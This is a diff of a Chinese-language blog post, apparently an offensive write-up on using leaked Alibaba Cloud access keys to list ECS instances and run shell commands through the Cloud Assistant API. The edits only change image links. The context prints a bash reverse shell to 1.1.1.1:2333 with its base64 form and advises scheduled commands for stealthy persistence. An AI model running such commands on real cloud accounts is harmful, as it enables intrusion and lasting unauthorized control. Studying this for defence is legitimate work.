@@ -68,7 +68,7 @@
 <p><code>http(s)://[BucketName].oss-cn-[Region].aliyuncs.com</code></p>
 <p>BucketName ：存储空间</p>
 <p>Region：地域，目前有如下几个：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b47095f0e521b2c64a785b3cbe165889.png" alt="2019-04-02-20-58-34"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/5f10d050-4f5f-11ec-b934-00d861bf4abb.png" alt="2019-04-02-20-58-34"></p>
 <p>例如：杭州 = cn-hangzhou</p>
 <h2 id="0x02-access-token">0x02 Access Token</h2>
 <p>Access Token = AccessKeyId + AccessKeySecret</p>
@@ -88,16 +88,16 @@ Access Secret : ***************************
 Region : cn-*****
 </code></pre><p>下面直接调用获取ECS实例的API即可，以往情况下，我会使用Python，安装阿里云的sdk-core库，但是现在能在线调试，大大的节省了本地调试的成本：</p>
 <p>DescribeInstances - 获得实例信息</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/e2155c603d701fd20696069aea984835.png" alt="2019-04-02-21-11-05"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/5f4963fc-4f5f-11ec-9a56-00d861bf4abb.png" alt="2019-04-02-21-11-05"></p>
 <p>只有第一个<code>RegionId</code>是必填项，点击<code>API Explorer</code>，可以直接进入调试环境：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/e7013aa30b06a0f6eb76ec22851c92b4.png" alt="2019-04-02-21-12-38"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/5f9a2274-4f5f-11ec-8f74-00d861bf4abb.png" alt="2019-04-02-21-12-38"></p>
 <p>服务器上的oss配置中刚好有RegionId，我就直接选择了，然后填入Access Token信息，就可以获得数据。</p>
 <p>我是直接在<code>Alicloud Shell</code>里复制了一份运行的：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/29658b26756b91ad7999c3586697f73a.png" alt="2019-04-02-21-16-55"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/5fe32866-4f5f-11ec-8225-00d861bf4abb.png" alt="2019-04-02-21-16-55"></p>
 <p>输出结果如下：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/3729d18e5454db84dfdd66b91344ea8c.png" alt="2019-04-02-21-21-17"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/60291bd2-4f5f-11ec-88bc-00d861bf4abb.png" alt="2019-04-02-21-21-17"></p>
 <p>使用<code>json.cn</code>格式化一下：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/6be7a9b9ceb7a55095aba804a63165dc.png" alt="2019-04-02-21-23-48"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/607ec69a-4f5f-11ec-a155-00d861bf4abb.png" alt="2019-04-02-21-23-48"></p>
 <p>共四台服务器，那么如何执行命令呢？</p>
 <p>首先要创建一条命令，然后指定实例来调用命令，手册地址：</p>
 <p><a href="https://help.aliyun.com/document_detail/64844.html">https://help.aliyun.com/document_detail/64844.html</a></p>
@@ -110,7 +110,7 @@ Region : cn-*****
 <p>由于都是Linux，我就选择RunShellScript，注意：命令必须是base64encode</p>
 <pre tabindex="0"><code>rvn0xsy@Rvn0xsy ~&gt; echo &quot;bash -i &gt;&amp; /dev/tcp/1.1.1.1/2333 0&gt;&amp;1&quot; | base64
 YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzIzMzMgMD4mMQo=
-</code></pre><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/64788dbca11e1dfd99c53caae568dccc.png" alt="2019-04-02-21-29-22"></p>
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/60c11202-4f5f-11ec-ac1c-00d861bf4abb.png" alt="2019-04-02-21-29-22"></p>
 <pre tabindex="0"><code>#!/usr/bin/env python
 #coding=utf-8
 
@@ -166,7 +166,7 @@ print(str(response, encoding='utf-8'))
 <li>Frequency：周期任务的执行周期，两次周期任务的时间间隔不能低于10秒。当参数 Timed 的值为 True 时，参数 Frequency 为必需参数。 该参数取值遵循Cron表达式，参阅<a href="https://help.aliyun.com/document_detail/64769.html?spm=a2c4g.11186623.2.21.755e1926kBOlWA">Cron表达式</a>。</li>
 </ul>
 <p>默认情况下，我们不需要管后面的参数，如果你想权限维持的话，可以设置Timed为False，并且设置Frequency为定时任务计划表达式，执行的过程中，基本上不会拦截，因为Access Token的调用，一切都是白名单的。</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/af5818d425ef9c61361044a26dd6e804.png" alt="2019-04-02-21-39-17"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/6109210a-4f5f-11ec-85d9-00d861bf4abb.png" alt="2019-04-02-21-39-17"></p>
 
 </div>
 <div class="container">
